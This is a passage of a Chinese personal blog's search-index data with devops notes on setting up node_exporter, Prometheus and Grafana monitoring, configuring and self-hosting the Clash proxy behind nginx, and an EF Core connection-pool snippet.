","date":"2023-07-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/:2:0","series":null,"tags":["blog","devops"],"title":"主机监控","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/#前置准备"},{"categories":["blog"],"content":" 操作手册 前置准备 安装prometheus 安装grafana 安装启动下载 node_exporter,并解压. 配置 supervisor 守护 /etc/supervisor/conf.d/node_exporter.conf [program:node_exporter] command = /root/node_exporter # 自动重启 autorestart = true # 启动失败的尝试次数 startretries = 3 # 进程20s没有退出，则判断启动成功 startsecs = 20 # 标准输出的文件路径 stdout_logfile = /tmp/node_exporter-supervisor.log # 日志文件最大大小 stdout_logfile_maxbytes=20MB # 日志文件保持数量 默认为10 设置为0 表示不限制 stdout_logfile_backups = 5 # 标准输出的文件路径 stderr_logfile = /tmp/node_exporter-supervisor.log # 日志文件最大大小 stderr_logfile_maxbytes=20MB # 日志文件保持数量 默认为10 设置为0 表示不限制 stderr_logfile_backups = 5 ","date":"2023-07-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/:2:0","series":null,"tags":["blog","devops"],"title":"主机监控","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/#安装启动"},{"categories":["blog"],"content":" 采集配置prometheus 采集配置 scrape_configs: - job_name: \"demo_node\" static_configs: - targets: [\"localhost:9100\"] ","date":"2023-07-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/:2:1","series":null,"tags":["blog","devops"],"title":"主机监控","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/#采集配置"},{"categories":["blog"],"content":" 监控面板配置grafana 的面板配置 添加 datasource 数据源 右上角加号,导入 dashboard Node Exporter Full | Grafana Labs ","date":"2023-07-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/:2:2","series":null,"tags":["blog","devops"],"title":"主机监控","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/#监控面板配置"},{"categories":["blog"],"content":" 效果展示 ","date":"2023-07-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/:3:0","series":null,"tags":["blog","devops"],"title":"主机监控","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/#效果展示"},{"categories":["point"],"content":"ssl 是一种国际标准的加密和身份认证通信协议. 要点: Vsftp, Web 证书, ssh 广泛使用 ","date":"2023-07-13","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/ssl/:0:0","series":null,"tags":["point","ssl"],"title":"ssl","uri":"/posts/%E7%AC%94%E8%AE%B0/point/ssl/#"},{"categories":["point"],"content":"这里记录一些特殊字符以及处理方法. \u0026nbsp; 是 HTML 中的特殊字符实体，代表一个非断行空格（non-breaking space）参考 Non-breaking space - Wikipedia,可以在这里复制使用 U+00A0 NO-BREAK SPACE - Unicode Explorer,然后去 vscode 里去全局查找 ","date":"2023-07-13","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/:0:0","series":null,"tags":["point","特殊字符"],"title":"特殊字符","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/#"},{"categories":["point"],"content":"clash 是一个代理软件. 要点: 开源 GitHub - Dreamacro/clash: A rule-based tunnel in Go. 免费 支持的协议多, 用的人多, 支持较好 ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/clash/:0:0","series":null,"tags":["point","clash"],"title":"clash","uri":"/posts/%E7%AC%94%E8%AE%B0/point/clash/#"},{"categories":["blog"],"content":"记录 [[笔记/point/clash|clash]] 的配置, 以及是如何使用的.一个文件就能搞定的东西, 就不折腾其他的方法了.为什么不用第三方订阅转换? 因为担心隐私.为什么不自建订阅转换? 因为觉得麻烦, 懒得维护.","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":" 简介记录 clash 的配置, 以及是如何使用的.一个文件就能搞定的东西, 就不折腾其他的方法了. 为什么不用第三方订阅转换? 因为担心隐私. 为什么不自建订阅转换? 因为觉得麻烦, 懒得维护. ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#简介"},{"categories":["blog"],"content":" 快速配置","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#快速配置"},{"categories":["blog"],"content":" 配置模板 - 复制保存成 yml port: 7890 socks-port: 7891 redir-port: 7892 mixed-port: 7893 # authentication: # - \"usr1:pass1\" allow-lan: true mode: Rule log-level: info ipv6: false hosts: external-controller: 0.0.0.0:9090 clash-for-android: append-system-dns: false profile: tracing: true dns: enable: true listen: 127.0.0.1:8853 default-nameserver: - 223.5.5.5 - 1.0.0.1 ipv6: false enhanced-mode: fake-ip fake-ip-filter: - \"*.lan\" - stun.*.*.* - stun.*.* - time.windows.com - time.nist.gov - time.apple.com - time.asia.apple.com - \"*.ntp.org.cn\" - \"*.openwrt.pool.ntp.org\" - time1.cloud.tencent.com - time.ustc.edu.cn - pool.ntp.org - ntp.ubuntu.com - ntp.aliyun.com - ntp1.aliyun.com - ntp2.aliyun.com - ntp3.aliyun.com - ntp4.aliyun.com - ntp5.aliyun.com - ntp6.aliyun.com - ntp7.aliyun.com - time1.aliyun.com - time2.aliyun.com - time3.aliyun.com - time4.aliyun.com - time5.aliyun.com - time6.aliyun.com - time7.aliyun.com - \"*.time.edu.cn\" - time1.apple.com - time2.apple.com - time3.apple.com - time4.apple.com - time5.apple.com - time6.apple.com - time7.apple.com - time1.google.com - time2.google.com - time3.google.com - time4.google.com - music.163.com - \"*.music.163.com\" - \"*.126.net\" - musicapi.taihe.com - music.taihe.com - songsearch.kugou.com - trackercdn.kugou.com - \"*.kuwo.cn\" - api-jooxtt.sanook.com - api.joox.com - joox.com - y.qq.com - \"*.y.qq.com\" - streamoc.music.tc.qq.com - mobileoc.music.tc.qq.com - isure.stream.qqmusic.qq.com - dl.stream.qqmusic.qq.com - aqqmusic.tc.qq.com - amobile.music.tc.qq.com - \"*.xiami.com\" - \"*.music.migu.cn\" - music.migu.cn - \"*.msftconnecttest.com\" - \"*.msftncsi.com\" - localhost.ptlogin2.qq.com - \"*.*.*.srv.nintendo.net\" - \"*.*.stun.playstation.net\" - xbox.*.*.microsoft.com - \"*.ipv6.microsoft.com\" - \"*.*.xboxlive.com\" - speedtest.cros.wr.pvp.net nameserver: - https://223.6.6.6/dns-query - https://rubyfish.cn/dns-query - https://dns.pub/dns-query fallback: - https://dns.rubyfish.cn/dns-query - https://public.dns.iij.jp/dns-query - tls://8.8.4.4 fallback-filter: geoip: true ipcidr: - 240.0.0.0/4 - 0.0.0.0/32 - 127.0.0.1/32 domain: - +.google.com - +.facebook.com - +.twitter.com - +.youtube.com - +.xn--ngstr-lra8j.com - +.google.cn - +.googleapis.cn - +.googleapis.com - +.gvt1.com # 节点信息配置 # 从你的订阅地址下载节点信息,过滤掉不包含香港的节点 proxy-providers: AMY-HongKong: type: http path: ./ProxySet/HongKong.yaml url: \"你的订阅地址\" interval: 3600 filter: \"香港\" health-check: enable: true url: http://www.gstatic.com/generate_204 interval: 300 AMY-US: type: http path: ./ProxySet/US.yaml url: \"你的订阅地址\" interval: 3600 filter: \"美国\" health-check: enable: true url: http://www.gstatic.com/generate_204 interval: 300 AMY-Taiwan: type: http path: ./ProxySet/Taiwan.yaml url: \"你的订阅地址\" interval: 3600 filter: \"台湾\" health-check: enable: true url: http://www.gstatic.com/generate_204 interval: 300 AMY-Japan: type: http path: ./ProxySet/Japan.yaml url: \"你的订阅地址\" interval: 3600 filter: \"日本\" health-check: enable: true url: http://www.gstatic.com/generate_204 interval: 300 AMY-Singapore: type: http path: ./ProxySet/Singapore.yaml url: \"你的订阅地址\" interval: 3600 filter: \"新加坡\" health-check: enable: true url: http://www.gstatic.com/generate_204 interval: 300 # 策略组配置 # type字段 # relay代表链式,不支持UDP. 例如流量先经过机场,到达自建节点.出口ip在自建节点,因此ip不变 # url-test测速选择 # select手动选择 # fallback请求失败了才会切换 # load-balance负载均衡,ip可能一直变. # tolerance字段,宽容毫秒数.如果少于100ms,就不切换节点 # interval字段,5*60秒尝试切换一次 proxy-groups: - name: 香港-auto type: url-test url: http://www.gstatic.com/generate_204 interval: 600 tolerance: 100 use: - AMY-HongKong - name: 美国-auto type: url-test url: http://www.gstatic.com/generate_204 interval: 600 tolerance: 150 use: - AMY-US - name: 所有-auto type: select url: http://www.gstatic.com/generate_204 interval: 600 use: - AMY-HongKong - AMY-US - AMY-Singapore - AMY-Japan - AMY-Taiwan # 从github拿到规则集,用的时候注意behavior,一般readme文件会有写behavior的值 # behavior的含义参考 https://github.com/Dreamacro/clash/issues/1165#issuecomment-753739205 rule-providers: ChinaMax: type: http behavior: classical url: \"https://","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#配置模板---复制保存成-yml"},{"categories":["blog"],"content":" 配置模板 - 修改必要信息修改订阅信息: proxy-providers: AMY-HongKong: type: http path: ./ProxySet/HongKong.yaml url: \"你的订阅地址\" interval: 3600 # 你的香港节点包含\"香港\"两个字,就填香港.包含\"HK\",就填\"HK\" filter: \"香港\" health-check: enable: true url: http://www.gstatic.com/generate_204 interval: 300 如果有自己特定的规则, 例如特定 ip, 特定网站需要走代理节点. 可以添加自定义规则: DOMAIN-SUFFIX：域名后缀匹配 DOMAIN：域名匹配 DOMAIN-KEYWORD：域名关键字匹配 IP-CIDR：IP 段匹配 SRC-IP-CIDR：源 IP 段匹配 GEOIP：GEOIP 数据库（国家代码）匹配 DST-PORT：目标端口匹配 SRC-PORT：源端口匹配 PROCESS-NAME：源进程名匹配 RULE-SET：Rule Provider 规则匹配 MATCH：全匹配 ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:2:2","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#配置模板---修改必要信息"},{"categories":["blog"],"content":" 导入配置文件 clash-verge 通过 ClashVerge=\u003e配置=\u003e新建, 类型 local,选择配置文件导入即可 也可以使用类型 remote, 不过这里会用到我的 TestServer工具. clash-for-windows clash界面=\u003eProfiles=\u003eImport选择你的yml文件 也可以使用类型 remote, 不过这里会用到我的 TestServer工具. ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:2:3","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#导入配置文件"},{"categories":["blog"],"content":" 导入配置文件 clash-verge 通过 ClashVerge=\u003e配置=\u003e新建, 类型 local,选择配置文件导入即可 也可以使用类型 remote, 不过这里会用到我的 TestServer工具. clash-for-windows clash界面=\u003eProfiles=\u003eImport选择你的yml文件 也可以使用类型 remote, 不过这里会用到我的 TestServer工具. ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:2:3","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#clash-verge"},{"categories":["blog"],"content":" 导入配置文件 clash-verge 通过 ClashVerge=\u003e配置=\u003e新建, 类型 local,选择配置文件导入即可 也可以使用类型 remote, 不过这里会用到我的 TestServer工具. clash-for-windows clash界面=\u003eProfiles=\u003eImport选择你的yml文件 也可以使用类型 remote, 不过这里会用到我的 TestServer工具. ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:2:3","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#clash-for-windows"},{"categories":["blog"],"content":" linux 下的 clash 安装","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:3:0","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#linux-下的-clash-安装"},{"categories":["blog"],"content":" 服务搭建 [!warning] clash 相关资源已经被删, 建议去 https://github.com/MetaCubeX/mihomo 下载替代下面的路径 linux 下的安装流程: mkdir clash ; cd clash # 下载clash wget https://github.com/Dreamacro/clash/releases/download/premium/clash-linux-amd64-2023.06.30.gz # 配置 gunzip clash-linux-amd64-2023.06.30.gz mv clash-linux-amd64-2023.06.30 clash chmod +x clash # 下载geo数据库 wget https://github.com/Loyalsoldier/geoip/releases/download/202307060123/Country.mmdb # 贴入配置,建议加上用户名密码 vim config.yaml ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:3:1","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#服务搭建"},{"categories":["blog"],"content":" 守护进程Systemd 配置文件 /etc/systemd/system/clash.service [Unit] Description=clash # 启动区间30s内,尝试启动3次 StartLimitIntervalSec=30 StartLimitBurst=3 [Service] # 环境变量 $MY_ENV1 # Environment=MY_ENV1=value1 # Environment=\"MY_ENV2=value2\" # 环境变量文件,文件内容\"MY_ENV3=value3\" $MY_ENV3 # EnvironmentFile=/path/to/environment/file1 WorkingDirectory=/root/clash ExecStart=/root/clash/clash -d /root/clash # 总是间隔30s重启,配合StartLimitIntervalSec实现无限重启 RestartSec=30s Restart=always # 相关资源都发送term后,后发送kill KillMode=mixed # 最大文件打开数不限制 LimitNOFILE=infinity # 子线程数量不限制 TasksMax=infinity [Install] WantedBy=multi-user.target Alias=clash.service ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:3:2","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#守护进程"},{"categories":["blog"],"content":" 反向 nginx 代理因为找了半天, 都没发现 clash 怎么配置 https, 所以通过 nginx 套一层 ssl 来保证安全性. 下面的配置通过 tcp 17890 端口代理出去. stream { upstream clash { hash $remote_addr consistent; server 127.0.0.1:7890; } server { listen 17890 ssl; ssl_certificate /etc/nginx/ssl/kentxxq.cer; ssl_certificate_key /etc/nginx/ssl/kentxxq.key; proxy_connect_timeout 30s; proxy_timeout 300s; proxy_pass clash; } } 使用方法 # linux export all_proxy=https://user1:pass1@a.kentxxq.com:17890; # windows set all_proxy=https://user1:pass1@a.kentxxq.com:17890; ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:3:3","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#反向-nginx-代理"},{"categories":["blog"],"content":" API","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:4:0","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#api"},{"categories":["blog"],"content":" 调整配置参考网址 # 查看当前配置 curl -X GET http://127.0.0.1:9090/configs # 切换成全局 curl -X PATCH http://127.0.0.1:9090/configs -d '{\"mode\":\"GLOBAL\"}' # 查看可用，一般有一个global curl -X GET http://127.0.0.1:9090/proxies # 查看global的配置，一般它的type是selector。而api只支持切换selector curl -X GET http://127.0.0.1:9090/proxies/GLOBAL # 切换到global里面的美国a节点 curl -v -X PUT 'http://127.0.0.1:9090/proxies/GLOBAL' -H \"Content-Type: application/json\" --data-raw '{\"name\": \"美国 A\"}' ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:4:1","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#调整配置"},{"categories":["blog"],"content":" ClashForWindows 应用配置","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:5:0","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#clashforwindows-应用配置"},{"categories":["blog"],"content":" 过期说明虽然 ClashForWindows 已经被删, 但是网上还是有一些 fork/中文包版本存在. 因此此章节内容仍然具备可操作性. 同时也可以帮助理解 UWP Loopback, bypass 等相关概念. ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:5:1","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#过期说明"},{"categories":["blog"],"content":" 绕过系统代理参考链接 绕过系统代理 | Clash for Windows Settings =\u003e System Proxy =\u003e Bypass Domain/IPNet bypass: - localhost - 127.* - 10.* - 172.16.* - 172.17.* - 172.18.* - 172.19.* - 172.20.* - 172.21.* - 172.22.* - 172.23.* - 172.24.* - 172.25.* - 172.26.* - 172.27.* - 172.28.* - 172.29.*`` - 172.30.* - 172.31.* - 192.168.* - \u003clocal\u003e ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:5:2","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#绕过系统代理"},{"categories":["blog"],"content":" 绕过 windows 应用类似于 windows 的应用商店, 邮箱等应用开启代理后会无法访问. 可以通过 UWP Loopback 跳过. ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:5:3","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#绕过-windows-应用"},{"categories":["blog"],"content":" 覆盖现有配置内容配置文件预处理 适用于不想修改配置文件, 特定于当前机器的特殊配置 键 值类型 操作 append-rules 数组 数组合并至原配置 rules 数组后 prepend-rules 数组 数组合并至原配置 rules 数组前 append-proxies 数组 数组合并至原配置 proxies 数组后 prepend-proxies 数组 数组合并至原配置 proxies 数组前 append-proxy-groups 数组 数组合并至原配置 proxy-groups 数组后 prepend-proxy-groups 数组 数组合并至原配置 proxy-groups 数组前 mix-proxy-providers 对象 对象合并至原配置 proxy-providers 中 mix-rule-providers 对象 对象合并至原配置 rule-providers 中 mix-object 对象 对象合并至原配置最外层中 commands 数组 在上面操作完成后执行简单命令操作配置文件 Settings=\u003eProfiles=\u003eParsers=\u003eedit 进入 parsers: - url: https://example.com/profile.yaml yaml: prepend-rules: - DOMAIN,test.com,DIRECT # rules最前面增加一个规则 append-proxies: - name: test # proxies最后面增加一个服务 type: http server: 123.123.123.123 port: 456 ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:5:4","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#覆盖现有配置内容"},{"categories":["blog"],"content":" 测试#todo/笔记 快速验证代理走的什么网络! ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:6:0","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#测试"},{"categories":["blog"],"content":" 疑难杂症","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:7:0","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#疑难杂症"},{"categories":["blog"],"content":" 安卓 app 不兼容代理即使配置了合适的分流规则, 京东, bilibili, 知乎等 app 兼容性还是有问题. 推荐配置应用分流. 允许服务跳过白名单/黑名单模式. 让指定应用绕过代理. 在 clash 中，关闭 \u003c为 vpn service 附加 http 代理\u003e 对我来说效果不好 相关内容: 安卓的 vpn 是 vpnservice 实例. 白名单/黑名单是安卓 api, 因此并不是在 app 内进行分流判断, 更省电. 安卓文档地址 Android 版 Clash 的“系统代理”选项是什么意思 - V2EX 京东故意降低 vpn 用户体验 - V2EX ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:7:1","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#安卓-app-不兼容代理"},{"categories":["blog"],"content":" 相关资源","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:8:0","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#相关资源"},{"categories":["blog"],"content":" 代理工具 hysteria内核 Xray-core是v2ray-core的超集 内核 sing-box 内核 clash 内核 Clash.Meta 内核 clash-verge 客户端 clashN 客户端 v2rayN 客户端 ClashForWindows 被删了, 但还有汉化版存在 Releases · Z-Siqi/Clash-for-Windows_Chinese (github.com) BoyceLig/Clash_Chinese_Patch: Clash For Windows 汉化补丁和汉化脚本 (github.com) 安卓 Surfboard - Apps on Google Play clashforandroid ios 工具 QuantumultX (圈 X) 强大工具 Loon 新工具, 对标 QuantumultX Stash ,兼容 clash Surge 最老牌, ios+mac Shadowrocket 大众化 + 便宜 Spectre 免费 相关讨论 https://www.v2ex.com/t/989650 服务商 佩奇小站 - AmyTelecom 魅影小站 - Ark 唯云四杰好像是有口碑的 一个机场收录站点 justmysocket Clash分流策略 | 配置文件 | 订阅防覆盖 | 硬核教程 Clash规则大全 GFW是如何工作的 ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:8:1","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#代理工具"},{"categories":["blog"],"content":" 代理站点 docker镜像源 github 代理 ","date":"2023-07-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/:8:2","series":null,"tags":["blog","clash"],"title":"clash配置","uri":"/posts/%E7%AC%94%E8%AE%B0/clash%E9%85%8D%E7%BD%AE/#代理站点"},{"categories":["point"],"content":"c 是一种静态强类型的变成语言. 要点: 免费 生态庞大 底层语言, 操作硬件 性能优势 ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/c/:0:0","series":null,"tags":["point","c"],"title":"c","uri":"/posts/%E7%AC%94%E8%AE%B0/point/c/#"},{"categories":["blog"],"content":" 简介这里记录 csharp 的 efcore 命令. ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84efcore%E5%91%BD%E4%BB%A4/:1:0","series":null,"tags":["blog","csharp"],"title":"csharp的efcore命令","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84efcore%E5%91%BD%E4%BB%A4/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84efcore%E5%91%BD%E4%BB%A4/:2:0","series":null,"tags":["blog","csharp"],"title":"csharp的efcore命令","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84efcore%E5%91%BD%E4%BB%A4/#内容"},{"categories":["blog"],"content":" 数据库连接池配置文件 appsettings.json { \"Logging\": { \"LogLevel\": { \"Default\": \"Warning\" } }, \"AllowedHosts\": \"*\", \"ConnectionStrings\": { \"BloggingDatabase\": \"Data Source=your_server_ip;Database=your_database_name;User ID=your_username;Min Pool Size=10;Password=your_password;Connect Timeout=30;Encrypt=False;TrustServerCertificate=False;ApplicationIntent=ReadWrite;MultiSubnetFailover=False\" } } 注入依赖 services.AddDbContextPool\u003cBloggingContext\u003e( options =\u003e{ options.UseSqlServer(Configuration.GetConnectionString(\"BloggingDatabase\")); } ,poolSize:64 ); ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84efcore%E5%91%BD%E4%BB%A4/:2:1","series":null,"tags":["blog","csharp"],"title":"csharp的efcore命令","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84efcore%E5%91%BD%E4%BB%A4/#数据库连接池"},{"categories":["point"],"content":"grafana 是一家公司, 有一个叫 grafana 的同名 web 显示工具. 要点: 开源, 免费 大量模板 日志, 指标, 展示, 链路全包含 ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/grafana/:0:0","series":null,"tags":["point","grafana"],"title":"grafana","uri":"/posts/%E7%AC%94%E8%AE%B0/point/grafana/#"},{"categories":["blog"],"content":"[[笔记/point/grafana|grafana]] 的使用教程","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-ui%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","grafana","监控","devops"],"title":"grafana-ui教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-ui%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介grafana-ui 是 grafana 公司的 UI 展示组件. ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-ui%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","grafana","监控","devops"],"title":"grafana-ui教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-ui%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 安装","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-ui%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","grafana","监控","devops"],"title":"grafana-ui教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-ui%E6%95%99%E7%A8%8B/#安装"},{"categories":["blog"],"content":" 服务安装参考官网 Install Grafana on Debian or Ubuntu | Grafana documentation,这个下载很慢, 建议挂上 apt代理 # 安装必要的包和签名key apt install -y apt-transport-https software-properties-common wget wget -q -O /usr/share/keyrings/grafana.key https://apt.grafana.com/gpg.key # 添加repo echo \"deb [signed-by=/usr/share/keyrings/grafana.key] https://apt.grafana.com stable main\" | sudo tee -a /etc/apt/sources.list.d/grafana.list # 安装, grafana-enterprise是企业版 apt update -y; apt install grafana -y # 启动 systemctl enable grafana-server --now # 默认密码 admin/admin curl 127.0.0.1:3000 ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-ui%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","grafana","监控","devops"],"title":"grafana-ui教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-ui%E6%95%99%E7%A8%8B/#服务安装"},{"categories":["blog"],"content":" nginx 配置配置 nginx 转发访问 server { listen 80; server_name om-grafana.chinnshi.com; return 301 https://$server_name$request_uri; access_log /usr/local/nginx/conf/hosts/logs/om-grafana.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name om-grafana.chinnshi.com; access_log /usr/local/nginx/conf/hosts/logs/om-grafana.kentxxq.com.log k-json; include /usr/local/nginx/conf/options/normal.conf; include /usr/local/nginx/conf/options/ssl_chinnshi.conf; location / { proxy_pass http://127.0.0.1:3000; } } ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-ui%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","grafana","监控","devops"],"title":"grafana-ui教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-ui%E6%95%99%E7%A8%8B/#nginx-配置"},{"categories":["blog"],"content":" 操作","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-ui%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","grafana","监控","devops"],"title":"grafana-ui教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-ui%E6%95%99%E7%A8%8B/#操作"},{"categories":["blog"],"content":" 重置密码 # 如果报错找不到默认配置 